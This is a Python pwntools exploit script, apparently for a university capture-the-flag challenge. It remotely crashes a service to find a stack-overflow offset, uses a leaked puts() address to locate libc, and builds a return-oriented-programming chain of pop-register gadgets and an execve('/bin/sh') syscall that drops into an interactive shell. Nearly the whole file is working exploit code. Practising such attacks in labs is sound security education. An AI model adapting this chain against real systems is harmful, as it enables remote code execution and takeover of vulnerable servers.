#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="critical",
        #log_level="debug", os="linux",
        terminal=["st"]
)


def start():
    return remote("cse4850-brop-1.chals.io", 443, ssl=True, sni="cse4850-brop-1.chals.io")


def find_offset():
    #for i in range(1, 216):
    for i in range(72, 216):
        print(f"\tTrying to crash program with {i} bytes")
        with context.quiet:
            p = start()
            p.sendlineafter(b"Lifehouse \n--------------------------------------------------------------------------------\n", cyclic(i))
            try:
                p.recvline()
            except EOFError:
                return int(i/8)*8

def exploit(p, e, r, offset):
    p.recvuntil(b"puts() ")
    leak = int(p.recvline(),16)

    libc_base = leak - e.sym["puts"]
    pop_rdi = p64(libc_base + r.find_gadget(["pop rdi", "ret"])[0])
    pop_rsi = p64(libc_base + r.find_gadget(["pop rsi", "ret"])[0])
    pop_rax = p64(libc_base + r.find_gadget(["pop rax", "ret"])[0])
    pop_rdx = p64(libc_base + r.find_gadget(["pop rdx", "ret"])[0])
    binsh = p64(libc_base + next(e.search(b"/bin/sh\x00")))
    syscall = p64(libc_base + r.find_gadget(["syscall"])[0])


    log.info(f"Libc Base: {hex(libc_base)}")
    log.info(f"Syscall: {hex(u64(syscall))}")
    log.info(f"Pop Rdi: {hex(u64(pop_rdi))}")
    log.info(f"Pop Rsi: {hex(u64(pop_rsi))}")
    log.info(f"Pop Rdx: {hex(u64(pop_rdx))}")
    log.info(f"Pop Rax: {hex(u64(pop_rax))}")
    log.info(f"binsh: {hex(u64(binsh))}")

    pad = b"A" * offset
    chain = pop_rdi + binsh
    chain += pop_rsi + p64(0)
    chain += pop_rdx + p64(0)
    chain += pop_rax + p64(59)
    chain += syscall
    p.sendline(pad + chain)
    p.interactive()



    return None


if __name__=="__main__":

    offset = find_offset()

    p = start()
    e = ELF("./libc.so.6")
    r = ROP(e)

    exploit(p, e, r, offset)
